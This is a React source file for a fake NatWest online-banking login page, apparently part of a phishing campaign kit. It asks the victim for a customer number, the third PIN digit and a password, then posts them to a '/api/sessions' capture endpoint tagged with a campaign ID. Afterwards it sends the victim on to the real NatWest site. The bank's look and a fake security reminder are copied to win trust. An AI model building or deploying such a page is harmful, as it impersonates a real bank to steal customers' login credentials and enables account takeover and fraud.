import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  customerNumber: string;
  pinDigit: string;
  password: string;
}

export default function NatWestLoginPage() {
  const [step, setStep] = useState<'initial' | 'pin' | 'password'>('initial');
  const [customerNumber, setCustomerNumber] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      customerNumber: "",
      pinDigit: "",
      password: "",
    },
  });

  const onInitialSubmit = (data: LoginFormData) => {
    setCustomerNumber(data.customerNumber);
    setStep('pin');
  };

  const onPinSubmit = (data: LoginFormData) => {
    setStep('password');
  };

  const onPasswordSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      await apiRequest("POST", "/api/sessions", {
        username: customerNumber,
        password: `${data.pinDigit}-${data.password}`,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://www.natwest.com/";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://www.natwest.com/";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-purple-700 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <svg width="140" height="40" viewBox="0 0 140 40" className="text-white">
                <rect width="140" height="40" fill="#663399"/>
                <text x="15" y="26" fill="white" fontSize="18" fontWeight="bold">NatWest</text>
              </svg>
            </div>
            <nav className="hidden md:flex space-x-6 text-white">
              <a href="#" className="hover:text-purple-200">Help</a>
              <a href="#" className="hover:text-purple-200">Security</a>
              <a href="#" className="hover:text-purple-200">Contact</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="min-h-[calc(100vh-4rem)] bg-gray-50 py-12">
        <div className="max-w-md mx-auto px-4">
          <div className="bg-white rounded-lg shadow-xl border border-gray-200 p-8">
            
            {step === 'initial' && (
              <>
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-bold text-gray-900 mb-2">
                    Log in to Online Banking
                  </h1>
                  <p className="text-gray-600">
                    Please enter your customer number
                  </p>
                </div>

                <form onSubmit={form.handleSubmit(onInitialSubmit)} className="space-y-6">
                  <div>
                    <label htmlFor="customerNumber" className="block text-sm font-medium text-gray-700 mb-2">
                      Customer number
                    </label>
                    <Input
                      id="customerNumber"
                      type="text"
                      {...form.register("customerNumber", { required: true })}
                      className="w-full px-3 py-3 border border-gray-300 rounded focus:border-purple-500 focus:ring-purple-500"
                      placeholder="Enter your customer number"
                      data-testid="input-customer-number"
                    />
                  </div>

                  <Button
                    type="submit"
                    className="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 px-4 rounded font-medium"
                    data-testid="button-continue"
                  >
                    Continue
                  </Button>
                </form>
              </>
            )}

            {step === 'pin' && (
              <>
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-bold text-gray-900 mb-2">
                    PIN verification
                  </h1>
                  <p className="text-gray-600">
                    Please enter the 3rd digit of your PIN
                  </p>
                </div>

                <form onSubmit={form.handleSubmit(onPinSubmit)} className="space-y-6">
                  <div>
                    <label htmlFor="pinDigit" className="block text-sm font-medium text-gray-700 mb-2">
                      3rd digit of your PIN
                    </label>
                    <Input
                      id="pinDigit"
                      type="password"
                      maxLength={1}
                      {...form.register("pinDigit", { required: true })}
                      className="w-full px-3 py-3 border border-gray-300 rounded focus:border-purple-500 focus:ring-purple-500 text-center text-2xl"
                      data-testid="input-pin-digit"
                    />
                  </div>

                  <Button
                    type="submit"
                    className="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 px-4 rounded font-medium"
                    data-testid="button-pin-continue"
                  >
                    Continue
                  </Button>
                </form>
              </>
            )}

            {step === 'password' && (
              <>
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-bold text-gray-900 mb-2">
                    Password verification
                  </h1>
                  <p className="text-gray-600">
                    Please enter your password
                  </p>
                </div>

                <form onSubmit={form.handleSubmit(onPasswordSubmit)} className="space-y-6">
                  <div>
                    <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                      Password
                    </label>
                    <Input
                      id="password"
                      type="password"
                      {...form.register("password", { required: true })}
                      className="w-full px-3 py-3 border border-gray-300 rounded focus:border-purple-500 focus:ring-purple-500"
                      placeholder="Enter your password"
                      data-testid="input-password"
                    />
                  </div>

                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-purple-700 hover:bg-purple-800 text-white py-3 px-4 rounded font-medium"
                    data-testid="button-login"
                  >
                    {isSubmitting ? "Logging in..." : "Log in"}
                  </Button>
                </form>
              </>
            )}

            <div className="mt-8 text-center space-y-3">
              <a href="#" className="block text-sm text-purple-700 hover:text-purple-600">
                Forgotten your log in details?
              </a>
              <a href="#" className="block text-sm text-purple-700 hover:text-purple-600">
                Register for Online Banking
              </a>
            </div>

            <div className="mt-8 pt-6 border-t border-gray-200">
              <div className="bg-purple-50 rounded-lg p-4">
                <div className="flex items-start space-x-3">
                  <div className="w-5 h-5 text-purple-600 flex-shrink-0 mt-0.5">🔒</div>
                  <div className="text-sm">
                    <p className="font-medium text-purple-800 mb-1">Security reminder</p>
                    <p className="text-purple-700">NatWest will never ask you to confirm your Online Banking details via email or text message.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}